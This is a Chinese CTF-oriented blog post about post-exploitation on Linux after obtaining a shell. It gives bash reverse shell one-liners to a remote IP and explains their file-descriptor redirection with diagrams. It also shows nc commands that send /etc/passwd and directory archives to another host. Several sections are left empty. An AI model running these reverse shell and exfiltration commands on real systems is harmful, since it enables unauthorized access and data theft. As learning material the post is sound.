---
title: shell之后的操作
date: 2018-04-10 00:00:26
categories: pwn
tags: [shell,linux]
---

### 0x00 前言

一般拿到shell之后能干什么？当然是反弹shell，然后进行一波扫操作了！但是你做题的时候，是否会遇到没有反弹shell的指令或者shell本身时长有限制，连上一会就断了！

### 0x01 shell

首先还是得讲[反弹shell和正向连接shell](/2017/12/09/反弹Shell/)

前面的这篇文章有了很好的讲解

### 0x02 延时操作

若是你上面的操作都不可实现，那么不妨尝试利用下面的指令

#### timeout指令

```
timeout 3000 /bin/bash
timeout 3000 /bin/sh
```

timeout是linux上常见指令，当你想长时间连上shell不断开的话，不妨使用此命令。



#### sleep指令

```
sleep 3		    终端睡眠3秒
sleep infinity  终端睡眠无限长事件
```



### 0x03 重定向

```
"1>" 通常可以省略成 ">"
1>&2  把正确返回值 传递给 2输出通道 ，&2表示2输出通道 
2>&1 把错误返回值 传递给1输出通道, 同样&1表示1输出通道. 

反弹shell:
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
bash -i 一个交互的bash，并且连上具体ip、port，
>& /dev/tcp/HOST/PORT  表示标准输入与标准输出通过这个连接发出
0>&1  标准输入通过这个连接读入
```

[反弹shell的官方解释](http://www.00theway.org/2017/07/11/bash%20%E5%8F%8D%E5%BC%B9shell/)

```
/dev/fd/fd
If fd is a valid integer, file descriptor fd is duplicated.

/dev/stdin
File descriptor 0 is duplicated.

/dev/stdout
File descriptor 1 is duplicated.

/dev/stderr
File descriptor 2 is duplicated.

/dev/tcp/host/port
If host is a valid hostname or Internet address, and port is an integer port number or service name, Bash attempts to open the corresponding TCP socket.

/dev/udp/host/port
If host is a valid hostname or Internet address, and port is an integer port number or service name, Bash attempts to open the corresponding UDP socket.
```

"\>\&"操作符的含义：

- 在“>&word”语法中，当word不是数字或“-”字符时，“>&”表示标准输出和标准错误重定向到文件，此时与操作符“&>”功能一样。
- 在“>&word”语法中，当word是数字或“-”字符时，操作符“>&”表示复制输出文件描述符


- ">word" 当word为1的时候，


- “word<”  当word为0，代表后面的输出转为输入；当word为1或2时，其实含义与">1"或">2"一致

仅有代码”bash -i”时输入输出状态

```
标准输入、标准输出和标准错误 全部指向shell（此状态定义为状态A）
 ---       +--------+
( 0 ) ---->| shell  |
 ---       +--------+
 ---       +--------+
( 1 ) ---->| shell  |
 ---       +--------+
 ---       +--------+
( 2 ) ---->|  shell |
 ---       +--------+
```

命令“>& /dev/tcp/host/port”是对标准输出和标准错误的重定向，此时的输入输出状态

```
标准输入指向shell，标准输出和标准错误指向socket连接文件（此状态定义为状态B）
 ---       +--------+
( 0 ) ---->| shell  |
 ---       +--------+
 ---       +--------+           +------------------+
( 1 ) ---->| shell  |  ----->   |/dev/tcp/host/port|
 ---       +--------+    --->   +------------------+
      	       	        /
 ---       +--------+  /
( 2 ) ---->| shell  | / 
 ---       +--------+
```

因此执行命令“bash -i >& /dev/tcp/host/port”时将标准输出和标准错误进行了重定向,使标准输出和标准错误指向socket连接文件，标准输入指向原有shell不变。

使用命令“bash -i >& /dev/tcp/host/port”还不能反弹shell，因为此时的输入还是指向shell，此时会出现在被控端（执行反弹shell命令的终端）执行命令，在控制端（监听端口的终端）回显得现象。

命令“0>&1”是对文件描述符的拷贝，是将0[标准输入]重定向到了1[标准输出]指向的位置，此时1[标准输出]指向的是socket连接文件，重定向完成后，0[标准输入]也指向了socket连接文件，状态如下

> 在状态B时，2[标准错误]指向的也是socket连接文件，因此命令”0>&2”与“0>&1”执行完后结果是一样的,所以反弹shell命令可以写成“bash -i >& /dev/tcp/host/port 0>&2”

```
标准输入、标准输出和标准错误全部指向socket连接文件（此状态定义为状态C）
 ---       +--------+
( 0 ) ---->| shell  |\
 ---       +--------+ \
                       \
 ---       +--------+    --->   +------------------+
( 1 ) ---->| shell  |  ----->   |/dev/tcp/host/port|
 ---       +--------+    --->   +------------------+
      	       	        /
 ---       +--------+  /
( 2 ) ---->| shell  | / 
 ---       +--------+
```

命令”bash -i 5\<\>/dev/tcp/host/port 0>&5 1>&5”也可以反弹shell

说明：\<\>代表的是输入输出

```
 ---       +--------+
( 0 ) ---->| shell  |\
 ---       +--------+ \
                       \
 ---       +--------+    --->  ---    ------1----->   +------------------+
( 1 ) ---->| shell  |  -----> ( 5 )                   |/dev/tcp/host/port|
 ---       +--------+    --->  ---    <-----0------   +------------------+
      	       	        /
 ---       +--------+  /
( 2 ) ---->| shell  | / 
 ---       +--------+
```

其他参考文档

[https://www.gnu.org/software/bash/manual/html_node/Redirections.html](https://www.gnu.org/software/bash/manual/html_node/Redirections.html)

### 0x04 下载文件

一般linux上或多或少会支持一些命令wget、curl等，当这些命令存在时就可以完成文件的下载。

但是特殊情况下是这些命令都不存在。下面讲一讲其他办法：

#### nc

```
 接受: ip:192.168.228.221 1234 passwd.txt    
 发送: ip:192.168.228.222 1234 /etc/passwd
 
 方法一：
 接受方
 nc -l 1234 |tar -zxvf -
 发送方
 tar -zcvf - dir |nc 192.168.228.221 1234
 
 方法二：
 接受方
 nc -l 1234 > passwd.txt
 发送方
 nc 192.168.228.221 1234 < /etc/passwd
```

#### python

```
import urllib
```

#### perl

一般的虚拟机上都会有

```

```

#### ruby

```

```

#### java

```

```

#### Lua

```

```

#### Bash

上面重定向讲得十分透彻，所以这儿就可以快速写出对应的bash脚本了(最终屈服了，没写出来，仍然用的反弹的shell)

```
将/usr/bin/curl 转化为16进制值，切片追加传输

echo 0x31323334 |xxd -r 
1234
```

